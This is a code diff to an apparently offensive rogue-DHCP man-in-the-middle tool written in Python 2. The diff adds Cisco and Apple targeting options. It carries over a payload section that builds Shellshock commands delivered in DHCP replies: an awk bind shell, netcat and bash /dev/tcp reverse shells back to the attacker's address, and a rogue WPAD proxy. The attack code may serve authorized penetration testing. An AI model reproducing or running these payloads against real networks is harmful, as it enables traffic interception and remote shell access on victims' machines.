@@ -25,6 +25,8 @@ parser.add_argument('-t', '--target_mac', type=str, help='Set target MAC address
 parser.add_argument('-I', '--target_ip', type=str, help='Set client IP address with MAC in --target_mac', default=None)
 parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')
 parser.add_argument('--apple', action='store_true', help='Apple devices MiTM')
+parser.add_argument('--cisco', action='store_true', help='Cisco devices MiTM')
+parser.add_argument('--not_exit', action='store_true', help='Not exit on success MiTM attack')
 
 parser.add_argument('-c', '--shellshock_command', type=str, help='Set shellshock command in DHCP client')
 parser.add_argument('-b', '--bind_shell', action='store_true', help='Use awk bind tcp shell in DHCP client')
@@ -167,6 +169,7 @@ if not args.quiet:
     print Base.c_info + "Router IP address: " + Base.cINFO + router_ip_address + Base.cEND
     print Base.c_info + "Network mask: " + Base.cINFO + network_mask + Base.cEND
     print Base.c_info + "DNS server IP address: " + Base.cINFO + dns_server_ip_address + Base.cEND
+    print Base.c_info + "TFTP server IP address: " + Base.cINFO + tftp_server_ip_address + Base.cEND
 
 
 def make_dhcp_offer_packet(transaction_id):
@@ -186,11 +189,15 @@ def make_dhcp_offer_packet(transaction_id):
                                      payload=None)
 
 
-def make_dhcp_ack_packet(transaction_id, requested_ip):
+def make_dhcp_ack_packet(transaction_id, requested_ip, destination_mac=None, destination_ip=None):
+    if destination_mac is None:
+        destination_mac = target_mac_address
+    if destination_ip is None:
+        destination_ip = requested_ip
     return dhcp.make_response_packet(source_mac=dhcp_server_mac_address,
-                                     destination_mac=target_mac_address,
+                                     destination_mac=destination_mac,
                                      source_ip=dhcp_server_ip_address,
-                                     destination_ip=requested_ip,
+                                     destination_ip=destination_ip,
                                      transaction_id=transaction_id,
                                      your_ip=requested_ip,
                                      client_mac=target_mac_address,
@@ -316,77 +323,83 @@ def dhcp_reply(request):
             print Base.c_info + "DHCP REQUEST from: " + target_mac_address + " transaction id: " + \
                 hex(transaction_id) + " requested ip: " + requested_ip
 
-            if args.apple:
-                ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
+            if args.cisco:
+                ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip, "ff:ff:ff:ff:ff:ff", "255.255.255.255")
                 SOCK.send(ack_packet)
-                print Base.c_info + "Send ack response!"
+                print Base.c_info + "Send ack response to Cisco device: " + target_mac_address
 
             else:
-                if target_ip_address is not None:
-                    if requested_ip != target_ip_address:
-                        nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
-                        SOCK.send(nak_packet)
-                        print Base.c_info + "Send nak response!"
-                        dhcpnak = True
-
-                else:
-                    if IPv4Address(unicode(requested_ip)) < IPv4Address(unicode(args.first_offer_ip)) \
-                            or IPv4Address(unicode(requested_ip)) > IPv4Address(unicode(args.last_offer_ip)):
-
-                        nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
-                        SOCK.send(nak_packet)
-                        print Base.c_info + "Send nak response!"
-                        dhcpnak = True
-
-                if not dhcpnak:
-                    net_settings = args.ip_path + "ip addr add " + requested_ip + \
-                                   "/" + str(IPAddress(network_mask).netmask_bits()) + " dev " + args.iface_name + ";"
-
-                    global payload
-
-                    if args.shellshock_command is not None:
-                        payload = args.shellshock_command
-
-                    if args.bind_shell:
-                        payload = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
-                                  "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
-
-                    if args.nc_reverse_shell:
-                        payload = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
-                                  your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
-
-                    if args.nce_reverse_shell:
-                        payload = "/bin/nc -e /bin/sh " + your_ip_address + " " + str(args.reverse_port) + " 2>&1 &"
-
-                    if args.bash_reverse_shell:
-                        payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
-                                  "/" + str(args.reverse_port) + " 0>&1 &"
-
-                    if payload is not None:
-
-                        if not args.without_network:
-                            payload = net_settings + payload
-
-                        if args.without_base64:
-                            shellshock_url = "() { :" + "; }; " + payload
-                        else:
-                            payload = b64encode(payload)
-                            shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + payload + ")"
-
-                    if shellshock_url is not None:
-                        if len(shellshock_url) > 255:
-                            print Base.c_error + "Len of command is very big! Current len: " + str(len(shellshock_url))
-                            shellshock_url = "A"
-
-                    global proxy
-                    if args.proxy is None:
-                        proxy = bytes("http://" + dhcp_server_ip_address + ":8080/wpad.dat")
-                    else:
-                        proxy = bytes(args.proxy)
-
+                if args.apple:
                     ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
                     SOCK.send(ack_packet)
-                    print Base.c_info + "Send ack response!"
+                    print Base.c_info + "Send ack response Apple device: " + target_mac_address
+
+                else:
+                    if target_ip_address is not None:
+                        if requested_ip != target_ip_address:
+                            nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
+                            SOCK.send(nak_packet)
+                            print Base.c_info + "Send nak response!"
+                            dhcpnak = True
+
+                    else:
+                        if IPv4Address(unicode(requested_ip)) < IPv4Address(unicode(args.first_offer_ip)) \
+                                or IPv4Address(unicode(requested_ip)) > IPv4Address(unicode(args.last_offer_ip)):
+
+                            nak_packet = make_dhcp_nak_packet(transaction_id, requested_ip)
+                            SOCK.send(nak_packet)
+                            print Base.c_info + "Send nak response!"
+                            dhcpnak = True
+
+                    if not dhcpnak:
+                        net_settings = args.ip_path + "ip addr add " + requested_ip + \
+                                       "/" + str(IPAddress(network_mask).netmask_bits()) + " dev " + args.iface_name + ";"
+
+                        global payload
+
+                        if args.shellshock_command is not None:
+                            payload = args.shellshock_command
+
+                        if args.bind_shell:
+                            payload = "awk 'BEGIN{s=\"/inet/tcp/" + str(args.bind_port) + \
+                                      "/0/0\";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &"
+
+                        if args.nc_reverse_shell:
+                            payload = "rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc " + \
+                                      your_ip_address + " " + str(args.reverse_port) + " >/tmp/f &"
+
+                        if args.nce_reverse_shell:
+                            payload = "/bin/nc -e /bin/sh " + your_ip_address + " " + str(args.reverse_port) + " 2>&1 &"
+
+                        if args.bash_reverse_shell:
+                            payload = "/bin/bash -i >& /dev/tcp/" + your_ip_address + \
+                                      "/" + str(args.reverse_port) + " 0>&1 &"
+
+                        if payload is not None:
+
+                            if not args.without_network:
+                                payload = net_settings + payload
+
+                            if args.without_base64:
+                                shellshock_url = "() { :" + "; }; " + payload
+                            else:
+                                payload = b64encode(payload)
+                                shellshock_url = "() { :" + "; }; /bin/sh <(/usr/bin/base64 -d <<< " + payload + ")"
+
+                        if shellshock_url is not None:
+                            if len(shellshock_url) > 255:
+                                print Base.c_error + "Len of command is very big! Current len: " + str(len(shellshock_url))
+                                shellshock_url = "A"
+
+                        global proxy
+                        if args.proxy is None:
+                            proxy = bytes("http://" + dhcp_server_ip_address + ":8080/wpad.dat")
+                        else:
+                            proxy = bytes(args.proxy)
+
+                        ack_packet = make_dhcp_ack_packet(transaction_id, requested_ip)
+                        SOCK.send(ack_packet)
+                        print Base.c_info + "Send ack response!"
 
     if request.haslayer(ARP):
         if target_ip_address is not None:
@@ -406,7 +419,7 @@ def dhcp_reply(request):
                     arp_req_router = True
 
                 if arp_req_router or arp_req_your_ip:
-                    if not possible_output and not args.apple:
+                    if not possible_output and not args.apple and not args.cisco:
                         try:
                             print Base.c_warning + "Possible MiTM! Target: " + Base.cWARNING + \
                                   target_ip_address + " (" + target_mac_address + ")" + Base.cEND
@@ -417,8 +430,9 @@ def dhcp_reply(request):
                     if target_mac_address is not None and target_ip_address is not None:
                         print Base.c_success + "MiTM success! Target: " + Base.cSUCCESS + target_ip_address + \
                               " (" + target_mac_address + ")" + Base.cEND
-                        SOCK.close()
-                        exit(0)
+                        if not args.not_exit:
+                            SOCK.close()
+                            exit(0)
     SOCK.close()
 
 
